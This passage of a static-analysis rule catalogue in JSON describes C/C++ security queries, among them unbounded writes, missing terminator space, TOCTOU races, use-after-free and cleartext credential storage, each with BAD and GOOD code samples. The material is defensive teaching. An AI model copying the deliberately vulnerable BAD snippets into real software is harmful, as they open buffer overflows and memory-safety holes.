[CWE-416](https://cwe.mitre.org/data/definitions/416.html).\n"
  },
  "cpp/memory-unsafe-function-scan": {
    "name": "Scanf function without a specified length",
    "description": "Use of one of the scanf functions without a specified length.",
    "kind": "problem",
    "problem.severity": "warning",
    "id": "cpp/memory-unsafe-function-scan",
    "tags": [
      "reliability",
      "security",
      "experimental",
      "external/cwe/cwe-120"
    ],
    "filename": "a49c8066-MemoryUnsafeFunctionScan",
    "language": "cpp",
    "help": "# Scanf function without a specified length\nIt is bad practice to use any of the `scanf` functions without including a specified length within the format parameter, as it will be vulnerable to buffer overflows.\n\n\n## Recommendation\nSpecify a length within the format string parameter, and make this length one less than the size of the buffer, since the last character should be reserved for the NULL terminator.\n\n\n## Example\nThe following example demonstrates safe and unsafe uses of `scanf` type functions.\n\n\n```cpp\n///// Library routines /////\n\nint scanf(const char *format, ...);\nint sscanf(const char *str, const char *format, ...);\nint fscanf(const char *str, const char *format, ...);\n\n///// EXAMPLES /////\n\nint main(int argc, char **argv)\n{\n\n    // BAD, do not use scanf without specifying a length first\n    char buf1[10];\n    scanf(\"%s\", buf1);\n\n    // GOOD, length is specified. The length should be one less than the size of the destination buffer, since the last character is the NULL terminator.\n    char buf2[20];\n    char buf3[10];\n    sscanf(buf2, \"%9s\", buf3);\n\n    // BAD, do not use scanf without specifying a length first\n    char file[10];\n    fscanf(file, \"%s\", buf2);\n\n    return 0;\n}\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-120](https://cwe.mitre.org/data/definitions/120.html).\n"
  },
  "cpp/toctou-race-condition": {
    "name": "Time-of-check time-of-use filesystem race condition",
    "description": "Separately checking the state of a file before operating on it may allow an attacker to modify the file between the two operations.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.7,
    "precision": "high",
    "id": "cpp/toctou-race-condition",
    "tags": [
      "security",
      "external/cwe/cwe-367"
    ],
    "filename": "fc3f7934-TOCTOUFilesystemRace",
    "language": "cpp",
    "help": "# Time-of-check time-of-use filesystem race condition\nOften it is necessary to check the state of a file before using it. These checks usually take a file name to be checked, and if the check returns positively, then the file is opened or otherwise operated upon.\n\nHowever, in the time between the check and the operation, the underlying file referenced by the file name could be changed by an attacker, causing unexpected behavior.\n\n\n## Recommendation\nWherever possible, use functions that operate on file descriptors rather than file names (for example, `fchmod` rather than `chmod`).\n\nFor access checks, you can temporarily change the UID and GID to that of the user whose permissions are being checked, and then perform the operation. This has the effect of \"atomically\" combining a permissions check with the operation.\n\nIf file-system locking tools are available on your platform, then locking the file before the check can prevent an unexpected update. However, note that on some platforms (for example, Unix) file-system locks are typically *advisory*, and so can be ignored by an attacker.\n\n\n## Example\nThe following example shows a case where a file is opened and then, if the opening was successful, its permissions are changed with `chmod`. However, an attacker might change the target of the file name between the initial opening and the permissions change, potentially changing the permissions of a different file.\n\n\n```c\nchar *file_name;\nFILE *f_ptr;\n\n/* Initialize file_name */\n\nf_ptr = fopen(file_name, \"w\");\nif (f_ptr == NULL)  {\n  /* Handle error */\n}\n\n/* ... */\n\nif (chmod(file_name, S_IRUSR) == -1) {\n  /* Handle error */\n}\n\nfclose(f_ptr);\n\n```\nThis can be avoided by using `fchmod` with the file descriptor that was received from opening the file. This ensures that the permissions change is applied to the very same file that was opened.\n\n\n```c\nchar *file_name;\nint fd;\n\n/* Initialize file_name */\n\nfd = open(\n  file_name,\n  O_WRONLY | O_CREAT | O_EXCL,\n  S_IRWXU\n);\nif (fd == -1) {\n  /* Handle error */\n}\n\n/* ... */\n\nif (fchmod(fd, S_IRUSR) == -1) {\n  /* Handle error */\n}\n\nclose(fd);\n\n```\n\n## References\n* The CERT Oracle Secure Coding Standard for C: [ FIO01-C. Be careful using functions that use file names for identification ](https://www.securecoding.cert.org/confluence/display/c/FIO01-C.+Be+careful+using+functions+that+use+file+names+for+identification).\n* Common Weakness Enumeration: [CWE-367](https://cwe.mitre.org/data/definitions/367.html).\n"
  },
  "cpp/sign-conversion-pointer-arithmetic": {
    "name": "unsigned to signed used in pointer arithmetic",
    "description": "finds unsigned to signed conversions used in pointer arithmetic, potentially causing an out-of-bound access",
    "id": "cpp/sign-conversion-pointer-arithmetic",
    "kind": "problem",
    "problem.severity": "warning",
    "tags": [
      "reliability",
      "security",
      "experimental",
      "external/cwe/cwe-787"
    ],
    "filename": "1739faeb-UnsignedToSignedPointerArith",
    "language": "cpp"
  },
  "cpp/use-of-unique-pointer-after-lifetime-ends": {
    "name": "Use of unique pointer after lifetime ends",
    "description": "Referencing the contents of a unique pointer after the underlying object has expired may lead to unexpected behavior.",
    "kind": "problem",
    "precision": "high",
    "id": "cpp/use-of-unique-pointer-after-lifetime-ends",
    "problem.severity": "warning",
    "security-severity": 8.8,
    "tags": [
      "reliability",
      "security",
      "external/cwe/cwe-416",
      "external/cwe/cwe-664"
    ],
    "filename": "dbf806fe-UseOfUniquePointerAfterLifetimeEnds",
    "language": "cpp",
    "help": "# Use of unique pointer after lifetime ends\nCalling `get` on a `std::unique_ptr` object returns a pointer to the underlying allocations. When the `std::unique_ptr` object is destroyed, the pointer returned by `get` is no longer valid. If the pointer is used after the `std::unique_ptr` object is destroyed, then the behavior is undefined.\n\n\n## Recommendation\nEnsure that the pointer returned by `get` does not outlive the underlying `std::unique_ptr` object.\n\n\n## Example\nThe following example gets a `std::unique_ptr` object, and then converts the resulting unique pointer to a pointer using `get` so that it can be passed to the `work` function. However, the `std::unique_ptr` object is destroyed as soon as the call to `get` returns. This means that `work` is given a pointer to invalid memory.\n\n\n```cpp\n#include <memory>\nstd::unique_ptr<T> getUniquePointer();\nvoid work(const T*);\n\n// BAD: the unique pointer is deallocated when `get` returns. So `work`\n// is given a pointer to invalid memory.\nvoid work_with_unique_ptr_bad() {\n  const T* combined_string = getUniquePointer().get();\n  work(combined_string);\n}\n```\nThe following example fixes the above code by ensuring that the pointer returned by the call to `get` does not outlive the underlying `std::unique_ptr` objects. This ensures that the pointer passed to `work` points to valid memory.\n\n\n```cpp\n#include <memory>\nstd::unique_ptr<T> getUniquePointer();\nvoid work(const T*);\n\n// GOOD: the unique pointer outlives the call to `work`. So the pointer\n// obtainted from `get` is valid.\nvoid work_with_unique_ptr_good() {\n  auto combined_string = getUniquePointer();\n  work(combined_string.get());\n}\n```\n\n## References\n* [MEM50-CPP. Do not access freed memory](https://wiki.sei.cmu.edu/confluence/display/cplusplus/MEM50-CPP.+Do+not+access+freed+memory).\n* Common Weakness Enumeration: [CWE-416](https://cwe.mitre.org/data/definitions/416.html).\n* Common Weakness Enumeration: [CWE-664](https://cwe.mitre.org/data/definitions/664.html).\n"
  },
  "cpp/divide-by-zero-using-return-value": {
    "name": "Divide by zero using return value",
    "description": "Possible cases of division by zero when using the return value from functions.",
    "kind": "problem",
    "id": "cpp/divide-by-zero-using-return-value",
    "problem.severity": "warning",
    "precision": "medium",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-369"
    ],
    "filename": "0f082cec-DivideByZeroUsingReturnValue",
    "language": "cpp",
    "help": "# Divide by zero using return value\nPossible cases of division by zero when using the return value from functions.\n\n\n## Example\nThe following example shows the use of a function with an error when using the return value and without an error.\n\n\n```cpp\n\n...\n  a = getc(f);\n  if (a < 123) ret = 123/a; // BAD\n...\n  if (a != 0) ret = 123/a; // GOOD\n...\n\n```\n\n## References\n* CERT Coding Standard: [INT33-C. Ensure that division and remainder operations do not result in divide-by-zero errors - SEI CERT C Coding Standard - Confluence](https://wiki.sei.cmu.edu/confluence/display/c/INT33-C.+Ensure+that+division+and+remainder+operations+do+not+result+in+divide-by-zero+errors).\n* Common Weakness Enumeration: [CWE-369](https://cwe.mitre.org/data/definitions/369.html).\n"
  },
  "cpp/cleartext-storage-database": {
    "name": "Cleartext storage of sensitive information in an SQLite database",
    "description": "Storing sensitive information in a non-encrypted database can expose it to an attacker.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "medium",
    "id": "cpp/cleartext-storage-database",
    "tags": [
      "security",
      "external/cwe/cwe-313"
    ],
    "filename": "90c4648d-CleartextSqliteDatabase",
    "language": "cpp",
    "help": "# Cleartext storage of sensitive information in an SQLite database\nSensitive information that is stored in an unencrypted SQLite database is accessible to an attacker who gains access to the database.\n\n\n## Recommendation\nEnsure that if sensitive information is stored in a database then the database is always encrypted.\n\n\n## Example\nThe following example shows two ways of storing information in an SQLite database. In the 'BAD' case, the credentials are simply stored in cleartext. In the 'GOOD' case, the database (and thus the credentials) are encrypted.\n\n\n```c\n\nvoid bad(void) {\n  const char *password = \"cleartext password\";\n  sqlite3 *credentialsDB;\n  sqlite3_stmt *stmt;\n\n  if (sqlite3_open(\"credentials.db\", &credentialsDB) == SQLITE_OK) {\n    // BAD: database opened without encryption being enabled\n    sqlite3_exec(credentialsDB, \"CREATE TABLE IF NOT EXISTS creds (password TEXT);\", NULL, NULL, NULL);\n    if (sqlite3_prepare_v2(credentialsDB, \"INSERT INTO creds(password) VALUES(?)\", -1, &stmt, NULL) == SQLITE_OK) {\n      sqlite3_bind_text(stmt, 1, password, -1, SQLITE_TRANSIENT);\n      sqlite3_step(stmt);\n      sqlite3_finalize(stmt);\n      sqlite3_close(credentialsDB);\n    }\n  }\n}\n\nvoid good(const char *secretKey) {\n  const char *password = \"cleartext password\";\n  sqlite3 *credentialsDB;\n  sqlite3_stmt *stmt;\n\n  if (sqlite3_open(\"credentials.db\", &credentialsDB) == SQLITE_OK) {\n    // GOOD: database encryption enabled:\n    std::string setKeyString = std::string(\"PRAGMA key = '\") + secretKey + \"'\";\n    sqlite3_exec(credentialsDB, setKeyString.c_str(), NULL, NULL, NULL);\n    sqlite3_exec(credentialsDB, \"CREATE TABLE IF NOT EXISTS creds (password TEXT);\", NULL, NULL, NULL);\n    if (sqlite3_prepare_v2(credentialsDB, \"INSERT INTO creds(password) VALUES(?)\", -1, &stmt, NULL) == SQLITE_OK) {\n      sqlite3_bind_text(stmt, 1, password, -1, SQLITE_TRANSIENT);\n      sqlite3_step(stmt);\n      sqlite3_finalize(stmt);\n      sqlite3_close(credentialsDB);\n    }\n  }\n}\n\n```\nNote that for the 'GOOD' example to work we need to provide a secret key. Secure key generation and storage is required.\n\n\n## References\n* M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.\n* M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n"
  },
  "cpp/no-space-for-terminator": {
    "name": "No space for zero terminator",
    "description": "Allocating a buffer using 'malloc' without ensuring that there is always space for the entire string and a zero terminator can cause a buffer overrun.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "cpp/no-space-for-terminator",
    "tags": [
      "reliability",
      "security",
      "external/cwe/cwe-131",
      "external/cwe/cwe-120",
      "external/cwe/cwe-122"
    ],
    "filename": "33a6355c-NoSpaceForZeroTerminator",
    "language": "cpp",
    "help": "# No space for zero terminator\nThis rule identifies calls to `malloc` that call `strlen` to determine the required buffer size, but do not allocate space for the zero terminator.\n\n\n## Recommendation\nThe highlighted code segment creates a buffer without ensuring it's large enough to accommodate the copied data. This leaves the code susceptible to a buffer overflow attack, which could lead to anything from program crashes to malicious code execution.\n\nIncrease the size of the buffer being allocated by one or replace `malloc`, `strcpy` pairs with a call to `strdup`\n\n\n## Example\n\n```c\n\nvoid flawed_strdup(const char *input)\n{\n\tchar *copy;\n\n\t/* Fail to allocate space for terminating '\\0' */\n\tcopy = (char *)malloc(strlen(input));\n\tstrcpy(copy, input);\n\treturn copy;\n}\n\n\n```\n\n## References\n* CERT C Coding Standard: [MEM35-C. Allocate sufficient memory for an object](https://www.securecoding.cert.org/confluence/display/c/MEM35-C.+Allocate+sufficient+memory+for+an+object).\n* Common Weakness Enumeration: [CWE-131](https://cwe.mitre.org/data/definitions/131.html).\n* Common Weakness Enumeration: [CWE-120](https://cwe.mitre.org/data/definitions/120.html).\n* Common Weakness Enumeration: [CWE-122](https://cwe.mitre.org/data/definitions/122.html).\n"
  },
  "cpp/operator-precedence-logic-error-when-use-bool-type": {
    "name": "Operator Precedence Logic Error When Use Bool Type",
    "description": "--Finding places of confusing use of boolean type. --For example, a unary minus does not work before a boolean type and an increment always gives true.",
    "kind": "problem",
    "id": "cpp/operator-precedence-logic-error-when-use-bool-type",
    "problem.severity": "warning",
    "precision": "medium",
    "tags": [
      "correctness",
      "security",
      "experimental",
      "external/cwe/cwe-783",
      "external/cwe/cwe-480"
    ],
    "filename": "134c1c3a-OperatorPrecedenceLogicErrorWhenUseBoolType",
    "language": "cpp",
    "help": "# Operator Precedence Logic Error When Use Bool Type\nFinding places of confusing use of boolean type. For example, a unary minus does not work before a boolean type and an increment always gives true.\n\n\n## Recommendation\nwe recommend making the code simpler.\n\n\n## Example\nThe following example demonstrates erroneous and fixed methods for using a boolean data type.\n\n\n```c\nif(len=funcReadData()==0) return 1; // BAD: variable `len` will not equal the value returned by function `funcReadData()`\n...\nif((len=funcReadData())==0) return 1; // GOOD: variable `len` equal the value returned by function `funcReadData()`\n...\nbool a=true;\na++;// BAD: variable `a` does not change its meaning\nbool b;\nb=-a;// BAD: variable `b` equal `true`\n...\na=false;// GOOD: variable `a` equal `false`\nb=!a;// GOOD: variable `b` equal `false`\n\n```\n\n## References\n* CERT C Coding Standard: [EXP00-C. Use parentheses for precedence of operation](https://wiki.sei.cmu.edu/confluence/display/c/EXP00-C.+Use+parentheses+for+precedence+of+operation).\n* Common Weakness Enumeration: [CWE-783](https://cwe.mitre.org/data/definitions/783.html).\n* Common Weakness Enumeration: [CWE-480](https://cwe.mitre.org/data/definitions/480.html).\n"
  },
  "cpp/private-cleartext-write": {
    "name": "Exposure of private information",
    "description": "If private information is written to an external location, it may be accessible by unauthorized persons.",
    "kind": "path-problem",
    "problem.severity": "error",
    "id": "cpp/private-cleartext-write",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-359"
    ],
    "filename": "981615e4-PrivateCleartextWrite",
    "language": "cpp",
    "help": "# Exposure of private information\nPrivate data that is stored in a file or buffer unencrypted is accessible to an attacker who gains access to the storage.\n\n\n## Recommendation\nEnsure that private data is always encrypted before being stored. It may be wise to encrypt information before it is put into a buffer that may be readable in memory.\n\nIn general, decrypt private data only at the point where it is necessary for it to be used in cleartext.\n\n\n## References\n* [OWASP Sensitive_Data_Exposure](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)\n* M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.\n* M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.\n* Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n"
  },
  "cpp/unbounded-write": {
    "name": "Unbounded write",
    "description": "Buffer write operations that do not control the length of data written may overflow.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.3,
    "precision": "medium",
    "id": "cpp/unbounded-write",
    "tags": [
      "reliability",
      "security",
      "external/cwe/cwe-120",
      "external/cwe/cwe-787",
      "external/cwe/cwe-805"
    ],
    "filename": "43f650fa-UnboundedWrite",
    "language": "cpp",
    "help": "# Unbounded write\nThe program performs a buffer copy or write operation with no upper limit on the size of the copy. An unexpectedly long input that reaches this code will cause the buffer to overflow. In addition to causing program instability, techniques exist which may allow an attacker to use this vulnerability to execute arbitrary code.\n\n\n## Recommendation\nAlways control the length of buffer copy and buffer write operations. `strncpy` should be used over `strcpy`, `snprintf` over `sprintf`, and in other cases 'n-variant' functions should be preferred.\n\n\n## Example\n\n```c\nvoid congratulateUser(const char *userName)\n{\n\tchar buffer[80];\n\n\t// BAD: this could overflow the buffer if the UserName is long\n\tsprintf(buffer, \"Congratulations, %s!\", userName);\n\n\tMessageBox(hWnd, buffer, \"New Message\", MB_OK);\n}\n```\nIn this example, the call to `sprintf` may overflow `buffer`. This occurs if the argument `userName` is very long, such that the resulting string is more than the 80 characters allowed.\n\nTo fix the problem the call to `sprintf` should be replaced with `snprintf`, specifying a maximum length of 80 characters.\n\n\n## References\n* CERT C Coding Standard: [STR31-C. Guarantee that storage for strings has sufficient space for character data and the null terminator](https://www.securecoding.cert.org/confluence/display/c/STR31-C.+Guarantee+that+storage+for+strings+has+sufficient+space+for+character+data+and+the+null+terminator).\n* CERT C++ Coding Standard: [STR50-CPP. Guarantee that storage for strings has sufficient space for character data and the null terminator](https://www.securecoding.cert.org/confluence/display/cplusplus/STR50-CPP.+Guarantee+that+storage+for+strings+has+sufficient+space+for+character+data+and+the+null+terminator).\n* Common Weakness Enumeration: [CWE-120](https://cwe.mitre.org/data/definitions/120.html).\n* Common Weakness Enumeration: [CWE-787](https://cwe.mitre.org/data/definitions/787.html).\n* Common Weakness Enumeration: [CWE-805](https://cwe.mitre.org/data/definitions/805.html).\n"
  },
  "cpp/comparison-with-wider-type": {
    "name": "Comparison of narrow type with wide type in loop condition",
    "description": "Comparisons between types of different widths in a loop condition can cause the loop to behave unexpectedly.",
    "id": "cpp/comparison-with-wider-type",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "tags": [
      "reliability",
      "security",
      "external/cwe/cwe-190",
      "external/cwe/cwe-197",
      "external/cwe/cwe-835"
    ],
    "filename": "d81e4b10-ComparisonWithWiderType",
    "language": "cpp",
    "help": "# Comparison of narrow type with wide type in loop condition\nIn a loop condition, comparison of a value of a narrow type with a value of a wide type may result in unexpected behavior if the wider value is sufficiently large (or small). This is because the narrower value may overflow. This can lead to an infinite loop.\n\n\n## Recommendation\nChange the types of the compared values so that the value on the narrower side of the comparison is at least as wide as the value it is being compared with.\n\n\n## Example\nIn this example, `bytes_received` is compared against `max_get` in a `while` loop. However, `bytes_received` is an `int16_t`, and `max_get` is an `int32_t`. Because `max_get` is larger than `INT16_MAX`, the loop condition is always `true`, so the loop never terminates.\n\nThis problem is avoided in the 'GOOD' case because `bytes_received2` is an `int32_t`, which is as wide as the type of `max_get`.\n\n\n```c\nvoid main(int argc, char **argv) {\n\tuint32_t big_num = INT32_MAX;\n\tchar buf[big_num];\n\tint16_t bytes_received = 0;\n\tint max_get = INT16_MAX + 1;\n\n\t// BAD: 'bytes_received' is compared with a value of a wider type.\n\t// 'bytes_received' overflows before  reaching 'max_get',\n\t// causing an infinite loop\n\twhile (bytes_received < max_get)\n\t\tbytes_received += get_from_input(buf, bytes_received);\n\t}\n\n\tuint32_t bytes_received = 0;\n\n\t// GOOD: 'bytes_received2' has a type  at least as wide as 'max_get'\n\twhile (bytes_received < max_get) {\n\t\tbytes_received += get_from_input(buf, bytes_received);\n\t}\n\n}\n\n\nint getFromInput(char *buf, short pos) {\n\t// write to buf\n\t// ...\n\treturn 1;\n}\n\n```\n\n## References\n* [Data type ranges](https://docs.microsoft.com/en-us/cpp/cpp/data-type-ranges)\n* [INT18-C. Evaluate integer expressions in a larger size before comparing or assigning to that size ](https://wiki.sei.cmu.edu/confluence/display/c/INT18-C.+Evaluate+integer+expressions+in+a+larger+size+before+comparing+or+assigning+to+that+size)\n* Common Weakness Enumeration: [CWE-190](https://cwe.mitre.org/data/definitions/190.html).\n* Common Weakness Enumeration: [CWE-197](https://cwe.mitre.org/data/definitions/197.html).\n* Common Weakness Enumeration: [CWE-835](https://cwe.mitre.org/data/definitions/835.html).\n"
  },
  "cpp/unreleased-lock": {
    "name": "Lock may not be released",
    "description": "A lock that is acquired one or more times without a matching number of unlocks may cause a deadlock.",
    "kind": "problem",
    "id": "cpp/unreleased-lock",
    "problem.severity": "error",
    "security-severity": 5.0,
    "precision": "low",
    "tags": [
      "security",
      "external/cwe/cwe-764",
      "external/cwe/cwe-833"
    ],
    "filename": "aeb98138-UnreleasedLock",
    "language": "cpp",
    "help": "# Lock may not be released\nWhen a thread acquires a lock it must make sure to unlock it again; failing to do so can lead to deadlocks. If a lock allows a thread to acquire it multiple times, for example `std::recursive_mutex`, then the number of locks must match the number of unlocks in order to fully release the lock.\n\n\n## Recommendation\nThe best way to ensure that locks are always unlocked is to use RAII (Resource Acquisition Is Initialization). That means acquiring the lock in the constructor of a class, and releasing it in its destructor. A local-scoped instance of that class will then be destroyed when it leaves scope, even if an exception is thrown, ensuring that the lock is released.\n\n\n## Example\nIn this example, the mutex may not be unlocked if the function returns early.\n\n\n```cpp\nstd::mutex mutex;\nint fun() {\n\tmutex.lock();\n\tbool succeeded = doWork();\n\tif (!succeeded) {\n\t\t// BAD: this does not release the mutex\n\t\treturn -1\n\t}\n\tmutex.unlock();\n\treturn 1;\n}\n\n```\nIn this second example, we show a simple RAII wrapper class for `std::mutex`. Using this ensures that even in the case of the early return, the mutex is released.\n\n\n```cpp\nclass RAII_Mutex\n{\n\tstd::mutex lock;\npublic:\n\tRAII_Mutex(mutex m) : lock(m)\n\t{\n\t\tlock.lock();\n\t}\n\n\t~RAII_Mutex()\n\t{\n\t\tlock.unlock();\n\t}\n};\n\n\nstd::mutex mutex;\nint fun() {\n\tRAII_Mutex(mutex);\n\n\tbool succeeded = doWork();\n\tif (!succeeded) {\n\t\t// GOOD: the RAII_Mutex is destroyed, releasing the lock\n\t\treturn -1\n\t}\n\t\n\treturn 1;\n}\n```\n\n## References\n* Common Weakness Enumeration: [CWE-764](https://cwe.mitre.org/data/definitions/764.html).\n* Common Weakness Enumeration: [CWE-833](https://cwe.mitre.org/data/definitions/833.html).\n"
  },
  "cpp/incorrect-pointer-scaling-char": {
    "name": "Suspicious pointer scaling to char",
    "description": "Implicit scaling of pointer arithmetic expressions can cause buffer overflow conditions.",
    "kind": "problem",
    "id": "cpp/incorrect-pointer-scaling-char",
    "problem.severity": "warning",
    "security-severity": 8.8,
    "precision": "low",
    "tags": [
      "security",
      "external/cwe/cwe-468"
    ],
    "filename": "94152eed-IncorrectPointerScalingChar",
    "language": "cpp",
    "help": "# Suspicious pointer scaling to char\nCasting arbitrary pointers into `char*` and then accessing their contents should be done with care. The results may not be portable.\n\nThis query finds pointer arithmetic expressions where a pointer to `char` (or similar) is dereferenced even though the underlying value is of a type larger than `char`.\n\n\n## Recommendation\n1. Whenever possible, use the array subscript operator rather than pointer arithmetic. For example, replace `*(p+k)` with `p[k]`.\n1. Cast to the correct type before using pointer arithmetic. For example, if the type of `p` is `char*` but it really points to an array of type `double[]` then use the syntax `(double*)p + k` to get a pointer to the `k`'th element of the array.\n\n## Example\n\n```cpp\nchar example1(int i) {\n  int intArray[5] = { 1, 2, 3, 4, 5 };\n  char *charPointer = (char *)intArray;\n  // BAD: the pointer arithmetic uses type char*, so the offset\n  // is not scaled by sizeof(int).\n  return *(charPointer + i);\n}\n\nint example2(int i) {\n  int intArray[10] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };\n  int *intPointer = intArray;\n  // GOOD: the offset is automatically scaled by sizeof(int).\n  return *(intPointer + i);\n}\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-468](https://cwe.mitre.org/data/definitions/468.html).\n"
  },
  "cpp/memory-leak-on-failed-call-to-realloc": {
    "name": "Memory leak on failed call to realloc",
    "description": "The expression mem = realloc (mem, size) is potentially dangerous, if the call fails, we will lose the pointer to the memory block. We recommend storing the result in a temporary variable and eliminating memory leak.",
    "kind": "problem",
    "id": "cpp/memory-leak-on-failed-call-to-realloc",
    "problem.severity": "warning",
    "precision": "medium",
    "tags": [
      "correctness",
      "security",
      "experimental",
      "external/cwe/cwe-401"
    ],
    "filename": "33eec492-MemoryLeakOnFailedCallToRealloc",
    "language": "cpp",
    "help": "# Memory leak on failed call to realloc\nMemory leak on failed call to realloc. The expression `mem = realloc (mem, size)` is potentially dangerous, if the call fails, we will lose the pointer to the memory block. An unsuccessful call is possible not only when trying to allocate a large amount of memory, but also when the process memory is strongly segmented.\n\nFalse positives include code in which immediately after calling the realloc function, the pointer is manipulated without first checking for validity. In this case, an exception will occur in the program and it will terminate. But from the point of view of safe coding, these places require the attention of developers. At this stage, false positives are also possible in situations where the exception handling is quite complicated and occurs outside the base block in which memory is redistributed.\n\n\n## Recommendation\nWe recommend storing the result in a temporary variable and eliminating memory leak.\n\n\n## Example\nThe following example demonstrates an erroneous and corrected use of the `realloc` function.\n\n\n```c\n// BAD: on unsuccessful call to realloc, we will lose a pointer to a valid memory block\nif (currentSize < newSize)\n{\n\tbuffer = (unsigned char *)realloc(buffer, newSize);\n}\n\n\n\n// GOOD: this way we will exclude possible memory leak \nunsigned char * tmp;\nif (currentSize < newSize)\n{\n\ttmp = (unsigned char *)realloc(buffer, newSize);\n}\nif (tmp == NULL)\n{\n\tfree(buffer);\n} \nelse\n\tbuffer = tmp;\n\n```\n\n## References\n* CERT C++ Coding Standard: [MEM51-CPP. Properly deallocate dynamically allocated resources](https://wiki.sei.cmu.edu/confluence/display/cplusplus/MEM51-CPP.+Properly+deallocate+dynamically+allocated+resources).\n* CERT C Coding Standard: [WIN30-C. Properly pair allocation and deallocation functions](https://wiki.sei.cmu.edu/confluence/display/c/WIN30-C.+Properly+pair+allocation+and+deallocation+functions).\n* Common Weakness Enumeration: [CWE-401](https://cwe.mitre.org/data/definitions/401.html).\n"
  },
  "cpp/double-release": {
    "name": "Errors When Double Release",
    "description": "Double release of the descriptor can lead to a crash of the program.",
    "kind": "problem",
    "id": "cpp/double-release",
    "problem.severity": "warning",
    "precision": "medium",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-675",
      "external/cwe/cwe-666"
    ],
    "filename": "6f0b12ce-DoubleRelease",
    "language": "cpp",
    "help": "# Errors When Double Release\nDouble release of the descriptor can lead to a crash of the program. Requires the attention of developers.\n\n\n## Recommendation\nWe recommend that you exclude situations of possible double release.\n\n\n## Example\nThe following example demonstrates an erroneous and corrected use of descriptor deallocation.\n\n\n```c\n...\n  fs = socket(AF_UNIX, SOCK_STREAM, 0)\n...\n  close(fs);\n  fs = -1; // GOOD\n...\n\n...\n  fs = socket(AF_UNIX, SOCK_STREAM, 0)\n...\n  close(fs);\n  if(fs) close(fs); // BAD\n...\n\n```\n\n## References\n* CERT C Coding Standard: [FIO46-C. Do not access a closed file](https://wiki.sei.cmu.edu/confluence/display/c/FIO46-C.+Do+not+access+a+closed+file).\n* Common Weakness Enumeration: [CWE-675](https://cwe.mitre.org/data/definitions/675.html).\n* Common Weakness Enumeration: [CWE-666](https://cwe.mitre.org/data/definitions/666.html).\n"
  },
  "cpp/system-data-exposure": {
    "name": "Exposure of system data to an unauthorized control sphere",
    "description": "Exposing system data or debugging information helps a malicious user learn about the system and form an attack plan.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 6.5,
    "precision": "high",
    "id": "cpp/system-data-exposure",
    "tags": [
      "security",
      "external/cwe/cwe-497"
    ],
    "filename": "bb987e2b-ExposedSystemData",
    "language": "cpp",
    "help": "# Exposure of system data to an unauthorized control sphere\nExposing system data or debugging information may help a malicious user learn about the system and form an attack plan. An attacker can use error messages that reveal technologies, operating systems, and product versions to tune their attack against known vulnerabilities in the software.\n\nThis query finds locations where system configuration information might be revealed to a remote user.\n\n\n## Recommendation\nDo not expose system configuration information to remote users. Be wary of the difference between information that could be helpful to users, and unnecessary details that could be useful to a malicious user.\n\n\n## Example\nIn this example the value of the `PATH` environment variable is revealed in full to the user when a particular error occurs. This might reveal information such as the software installed on your system to a malicious user who does not have legitimate access to that information.\n\n\n```cpp\nchar* path = getenv(\"PATH\");\n\n//...\n\nsprintf(buffer, \"Cannot find exe on path: %s\", path);\nsend(socket, buffer, strlen(buffer), 0);\n\n```\nThe message should be rephrased without this information, for example:\n\n\n```cpp\nchar* path = getenv(\"PATH\");\n\n//...\n\nmessage = \"An internal error has occurred. Please try again or contact a system administrator.\\n\";\nsend(socket, message, strlen(message), 0);\n```\n\n## References\n* Common Weakness Enumeration: [CWE-497](https://cwe.mitre.org/data/definitions/497.html).\n"
  },
  "cpp/unsigned-difference-expression-compared-zero": {
    "name": "Unsigned difference expression compared to zero",
    "description": "A subtraction with an unsigned result can never be negative. Using such an expression in a relational comparison with `0` is likely to be wrong.",
    "kind": "problem",
    "id": "cpp/unsigned-difference-expression-compared-zero",
    "problem.severity": "warning",
    "security-severity": 9.8,
    "precision": "high",
    "tags": [
      "security",
      "correctness",
      "external/cwe/cwe-191"
    ],
    "filename": "20efc74d-UnsignedDifferenceExpressionComparedZero",
    "language": "cpp",
    "help": "# Unsigned difference expression compared to zero\nThis rule finds relational comparisons between the result of an unsigned subtraction and the value `0`. Such comparisons are likely to be wrong as the value of an unsigned subtraction can never be negative. So the relational comparison ends up checking whether the result of the subtraction is equal to `0`. This is probably not what the programmer intended.\n\n\n## Recommendation\nIf a relational comparison is intended, consider casting the result of the subtraction to a signed type. If the intention was to test for equality, consider replacing the relational comparison with an equality test.\n\n\n## Example\n\n```c\nuint32_t limit = get_limit();\nuint32_t total = 0;\n\nwhile (limit - total > 0) { // BAD: if `total` is greater than `limit` this will underflow and continue executing the loop.\n  total += get_data();\n}\n\nwhile (total < limit) { // GOOD: never underflows here because there is no arithmetic.\n  total += get_data();\n}\n\nwhile ((int64_t)limit - total > 0) { // GOOD: never underflows here because the result always fits in an `int64_t`.\n  total += get_data();\n}\n\n```\n\n## References\n* SEI CERT C Coding Standard: [INT02-C. Understand integer conversion rules](https://wiki.sei.cmu.edu/confluence/display/c/INT02-C.+Understand+integer+conversion+rules).\n* Common Weakness Enumeration: 